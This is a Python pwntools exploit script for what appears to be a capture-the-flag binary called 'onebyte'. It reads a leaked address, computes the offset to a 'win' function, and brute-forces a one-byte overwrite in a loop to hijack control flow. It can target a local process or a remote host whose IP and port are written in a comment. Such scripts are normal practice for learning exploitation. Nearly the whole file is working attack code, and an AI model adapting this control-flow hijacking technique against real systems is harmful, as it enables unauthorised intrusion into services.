from pwn import *
from pwn import p32

# NOTE XXX context binary is absolutly necessary when getting addresses from file
exe = ELF("./onebyte", checksec=False)
# context.binary = exe

if args.REMOTE: # REMOTE=157.245.39.76:32334
	p = remote(args.REMOTE.split(':')[0],int(args.REMOTE.split(':')[1]))
else:
	p = exe.process()

offset = exe.symbols['win'] - exe.symbols['init']
log.info(f"Offset: {offset}")

# # With this bit I can run gdb a bunch of times and eventually
# # get the integer that would allow me to return to an address
# # saved on the passed buffer. That integer is 52 with gdb
# for i in range(32,80,2):
# 	log.info("Attempt %s" % i)
# 	with open('input','wb') as inp:
# 		inp.write(b"A"*0x10 + int.to_bytes(i))
# 	gdb.attach(p, '''
# 	b *main+93
# 	b *main+110
# 	r < input
# 	''')
# 	p.interactive()
# 	p = exe.process()

# Couldn't figure out what would be the correct offset would be
# So decided to run through a bunch of them. Eventually hit 40 locally and 50 on the remote
for i in range(32,80,2):
	log.info("Attempt %s" % i)

	p.recvuntil(b'Free junk: ')
	addr = p.recv(10)
	win_addr = p32(int(addr,16) + offset)
	p.sendline(win_addr + b'A' * (0x10 - 4) + int.to_bytes(0x34))
	p.interactive()
	if args.REMOTE: # REMOTE=157.245.39.76:32334
		p = remote(args.REMOTE.split(':')[0],int(args.REMOTE.split(':')[1]))
	else:
		p = exe.process()
